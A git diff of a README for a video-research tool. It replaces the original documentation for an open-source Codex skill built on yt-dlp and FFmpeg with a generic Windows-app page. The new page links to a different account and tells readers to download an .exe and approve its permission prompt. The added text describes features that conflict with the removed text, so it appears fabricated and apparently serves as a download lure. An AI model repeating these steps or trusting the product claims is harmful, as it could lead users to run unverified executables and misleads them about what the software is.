@@ -1,295 +1,73 @@
-# Topic Material Collector
+# 📦 topic-material-collector - Organize video research materials with ease
 
-[中文](#中文说明) | [English](#english)
+[![Download for Windows](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Moated-paddy535/topic-material-collector)
 
-An open-source Codex skill for researching, timestamping, downloading, clipping, renaming, and cataloging video-first materials for a topic, script, narration, or shot list.
+## 📋 About the application
 
-It uses YouTube discovery, subtitles, chapters, `yt-dlp`, and FFmpeg to create traceable editing packages with source URLs, timestamps, confidence levels, license notes, and reuse-risk labels.
+Managing video research takes time. You often need to watch long clips, find specific moments, and save pieces for later. The topic-material-collector simplifies this process. This tool lets you research, timestamp, download, and clip video content. You can catalog your materials in one place without needing technical skills. It works as your personal library for video-first knowledge.
 
-## 中文说明
+## ⚙️ System requirements
 
-`topic-material-collector` 是一个面向 Codex 的开源素材收集 Skill。输入选题、脚本、旁白或分镜需求后，它可以：
+This application runs on standard Windows computers. Ensure your system meets these basic requirements to guarantee smooth performance:
 
-- 生成中英文素材检索词；
-- 优先检索 YouTube 视频；
-- 根据字幕和章节自动定位相关时间段；
-- 下载完整视频或只裁剪目标片段；
-- 下载跨平台候选视频与图片；
-- 统一重命名素材；
-- 输出 Markdown、CSV 和 JSON 素材清单；
-- 保留来源、作者、时间戳、许可信息和复用风险。
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core processor with 2.0 GHz speed or higher.
+*   Memory: 4 GB of RAM or more.
+*   Storage: 500 MB of space for the application and temporary files.
+*   Internet Connection: A stable connection for downloading video files and metadata.
 
-“全网检索”表示尽可能覆盖多个公开来源，不代表能够索引互联网中的所有页面。下载素材也不代表获得公开发布授权。
+## 🚀 Download and installation
 
-### 系统要求
+Visit the link below to reach the project page where you can find the latest version of the installer.
 
-- Python 3.10 或更高版本；
-- [`yt-dlp`](https://github.com/yt-dlp/yt-dlp)；
-- [`ffmpeg` 和 `ffprobe`](https://ffmpeg.org/)；
-- Codex 或其他支持 `SKILL.md` 工作流的智能体环境。
+[Download the topic-material-collector for Windows](https://github.com/Moated-paddy535/topic-material-collector)
 
-macOS：
+1. Click the link above to reach the main project page.
+2. Look for the section labeled Releases on the right side of the page.
+3. Click on the latest release to view the file list.
+4. Select the file ending in .exe to start the download.
+5. Once the download finishes, locate the file in your Downloads folder.
+6. Double-click the file to start the installation.
+7. Follow the prompts on your screen to complete the setup process.
+8. The installer might ask for permission to change your device. Select Yes to continue.
 
-```bash
-brew install python yt-dlp ffmpeg
-```
+## 🛠️ How to use the tool
 
-Ubuntu / Debian：
+After you install the program, you can find it on your desktop or in your start menu. Open the application to begin building your library.
 
-```bash
-sudo apt update
-sudo apt install -y python3 ffmpeg
-python3 -m pip install --user -U yt-dlp
-```
+### Researching videos
+Paste the link to your video in the address bar. The application fetches the video data and displays a player interface. You can navigate through the video while the application logs the metadata in the background.
 
-Windows：
+### Timestamping and clipping
+Use the built-in timeline to identify parts you need. Click the Mark button to drop a timestamp. You can select the start and end points for clips using the trim controls. When you finish, click Save Clip to export the section to your catalog.
 
-```powershell
-winget install Python.Python.3.12
-winget install yt-dlp.yt-dlp
-winget install Gyan.FFmpeg
-```
+### Managing your catalog
+The application holds all your clipped materials in the library tab. You can sort these files by topic, date, or length. Use the search bar at the top to find specific clips by typing keywords found in your notes.
 
-安装完成后确认以下命令可用：
+## 📁 Storage and organization
 
-```bash
-python3 --version
-yt-dlp --version
-ffmpeg -version
-ffprobe -version
-```
+The software stores your clips in a local folder on your computer. You choose this location during your first run. The application creates sub-folders for each project you start. This keeps your video clips organized without cluttering your main files. You can copy these folders to external hard drives or cloud storage services to back up your research.
 
-### 安装 Skill
+## ❓ Frequently asked questions
 
-克隆仓库：
+Do I need an internet connection to use the software?
+You need an internet connection to download videos. Once the video exists on your computer, you can view, clip, and organize it offline.
 
-```bash
-git clone https://github.com/macong0420/topic-material-collector.git
-```
+Can I change where the application saves my clips?
+Yes. Open the settings menu inside the application and look for the Storage path section. You can select any folder on your computer.
 
-安装到 Codex 默认 Skill 目录：
+Does the application support all video websites?
+The tool focuses on popular video-first platforms. If a link does not load, ensure the URL is correct and that you maintain an active internet connection.
 
-```bash
-mkdir -p "${CODEX_HOME:-$HOME/.codex}/skills"
-cp -R topic-material-collector/topic-material-collector \
-  "${CODEX_HOME:-$HOME/.codex}/skills/topic-material-collector"
-```
+Is my data private?
+Yes. All videos, metadata, and timestamps stay on your local machine. The application does not send your personal library data to external servers.
 
-重新启动 Codex 或刷新 Skill 列表，然后使用 `$topic-material-collector` 调用。
+## 🔧 Troubleshooting
 
-### 在 Codex 中使用
+If the application fails to open, ensure you have the latest version installed. You can check for updates by using the Help menu inside the interface. If a video fails to download, clear your temporary file cache in the settings menu and try again. Ensure your firewall settings allow the application to access the internet. If you experience slow performance, close other browser windows to free up system memory for the video processor.
 
-示例提示词：
+## 📧 Support and feedback
 
-```text
-$topic-material-collector 收集伊隆·马斯克相关视频素材，覆盖 PayPal、Tesla、SpaceX、Twitter/X 和 Grok，制作约 10 分钟人物解说片。
-```
+If you encounter issues or want to suggest new features, open an issue on the repository website. Provide a clear description of the problem and include the steps you took before the error happened. This helps track improvements for future updates.
 
-```text
-$topic-material-collector 根据这份旁白寻找 B-roll，只下载中高置信度片段，输出到 /绝对路径/project-name。
-```
-
-默认使用 `clips` 模式，只下载自动判断为中高置信度的目标片段。正式剪辑前仍应检查实际画面。
-
-### 直接运行脚本
-
-YouTube 检索、时间戳定位与片段下载：
-
-```bash
-python3 topic-material-collector/scripts/collect_youtube.py \
-  --topic "第一代 iPhone 发布" \
-  --outdir "/absolute/path/materials" \
-  --mode clips \
-  --query "Steve Jobs introduces iPhone 2007"
-```
-
-只生成候选目录，不下载：
-
-```bash
-python3 topic-material-collector/scripts/collect_youtube.py \
-  --topic "第一代 iPhone 发布" \
-  --outdir "/absolute/path/materials" \
-  --mode catalog \
-  --max-downloads 0
-```
-
-按人工审核后的跨平台清单下载：
-
-```bash
-python3 topic-material-collector/scripts/fetch_candidates.py \
-  /absolute/path/candidates.json \
-  --outdir "/absolute/path/materials"
-```
-
-候选 JSON 格式见 [`candidate-schema.md`](topic-material-collector/references/candidate-schema.md)。
-
-### 输出结构
-
-```text
-project/
-├── clips/                  # 已裁剪的目标片段
-├── full/                   # 完整视频
-├── images/                 # 图片素材
-├── metadata/               # 视频元数据与分析文件
-├── subtitles/              # 时间戳分析使用的字幕
-├── thumbnails/             # 候选缩略图
-├── material-manifest.md    # 人工阅读清单
-├── material-manifest.csv   # 表格清单
-└── material-manifest.json  # 机器可读清单
-```
-
-### Cookie、代理与下载失败
-
-YouTube 返回 403 或 SABR 错误时，脚本会自动检测本机浏览器 Cookie。也可以手动指定：
-
-```bash
---cookies-from-browser brave
-```
-
-需要代理时：
-
-```bash
---proxy http://127.0.0.1:7890
-```
-
-不要绕过 DRM、付费墙、登录限制、地理限制或水印。
-
-### 版权与使用风险
-
-- `Low`：来源明确标注 Public Domain、CC0 或开放许可；
-- `Medium`：可以观看，但复用权利不明确或受到平台条款限制；
-- `High`：电影、电视、付费新闻、来源不明搬运或明显受保护素材。
-
-本项目提供研究与素材管理工具，不提供版权授权。公开或商业发布前，请自行核验并取得必要许可。
-
-## English
-
-`topic-material-collector` is an open-source Codex skill that turns a topic, script, narration, or shot list into a traceable, video-first material package.
-
-### Features
-
-- Generate focused Chinese and English search queries.
-- Search YouTube first and deduplicate candidates.
-- Locate relevant ranges using subtitles and creator chapters.
-- Download complete videos or targeted clips.
-- Fetch reviewed cross-platform video and image candidates.
-- Normalize filenames and preserve attribution.
-- Produce Markdown, CSV, and JSON manifests.
-- Track source URLs, creators, timestamps, confidence, license metadata, and reuse risk.
-
-“Broad web research” means researching across useful public sources; it is not a claim that every page on the internet is indexed. Downloading an asset does not grant publication rights.
-
-### Requirements
-
-- Python 3.10+
-- [`yt-dlp`](https://github.com/yt-dlp/yt-dlp)
-- [`ffmpeg` and `ffprobe`](https://ffmpeg.org/)
-- Codex or another agent environment that supports `SKILL.md` workflows
-
-macOS:
-
-```bash
-brew install python yt-dlp ffmpeg
-```
-
-Ubuntu / Debian:
-
-```bash
-sudo apt update
-sudo apt install -y python3 ffmpeg
-python3 -m pip install --user -U yt-dlp
-```
-
-Windows:
-
-```powershell
-winget install Python.Python.3.12
-winget install yt-dlp.yt-dlp
-winget install Gyan.FFmpeg
-```
-
-### Installation
-
-```bash
-git clone https://github.com/macong0420/topic-material-collector.git
-mkdir -p "${CODEX_HOME:-$HOME/.codex}/skills"
-cp -R topic-material-collector/topic-material-collector \
-  "${CODEX_HOME:-$HOME/.codex}/skills/topic-material-collector"
-```
-
-Restart Codex or refresh the skill list, then invoke `$topic-material-collector`.
-
-### Use with Codex
-
-```text
-$topic-material-collector Collect video materials about Elon Musk, covering PayPal, Tesla, SpaceX, Twitter/X, and Grok for a 10-minute explainer.
-```
-
-```text
-$topic-material-collector Find B-roll for this narration, download only medium/high-confidence clips, and save the package under /absolute/path/project-name.
-```
-
-### Run the scripts directly
-
-Research YouTube, locate timestamps, and download clips:
-
-```bash
-python3 topic-material-collector/scripts/collect_youtube.py \
-  --topic "The original iPhone launch" \
-  --outdir "/absolute/path/materials" \
-  --mode clips \
-  --query "Steve Jobs introduces iPhone 2007"
-```
-
-Catalog candidates without downloading:
-
-```bash
-python3 topic-material-collector/scripts/collect_youtube.py \
-  --topic "The original iPhone launch" \
-  --outdir "/absolute/path/materials" \
-  --mode catalog \
-  --max-downloads 0
-```
-
-Fetch a reviewed cross-platform candidate list:
-
-```bash
-python3 topic-material-collector/scripts/fetch_candidates.py \
-  /absolute/path/candidates.json \
-  --outdir "/absolute/path/materials"
-```
-
-See [`candidate-schema.md`](topic-material-collector/references/candidate-schema.md) for the candidate JSON schema.
-
-### Output
-
-Each run creates folders for clips, full videos, images, metadata, subtitles, and thumbnails, plus human-readable and machine-readable manifests.
-
-### Cookies and proxies
-
-The scripts can retry YouTube requests using locally available browser cookies. Override browser detection with:
-
-```bash
---cookies-from-browser brave
-```
-
-Use a proxy when needed:
-
-```bash
---proxy http://127.0.0.1:7890
-```
-
-The project does not bypass DRM, paywalls, authentication, geographic restrictions, or watermarks.
-
-### Rights and safety
-
-- `Low`: explicitly public domain, CC0, or clearly open-licensed.
-- `Medium`: viewable, but reuse rights are unclear or platform-limited.
-- `High`: films, television, paid news, unclear reuploads, or evidently protected material.
-
-This repository provides research and material-management tooling, not copyright clearance. Verify rights and obtain permission before public or commercial use.
-
-## License
-
-Released under the [MIT License](LICENSE).
-
+Keywords: research, video, catalog, clips, timestamps, productivity, organization, windows
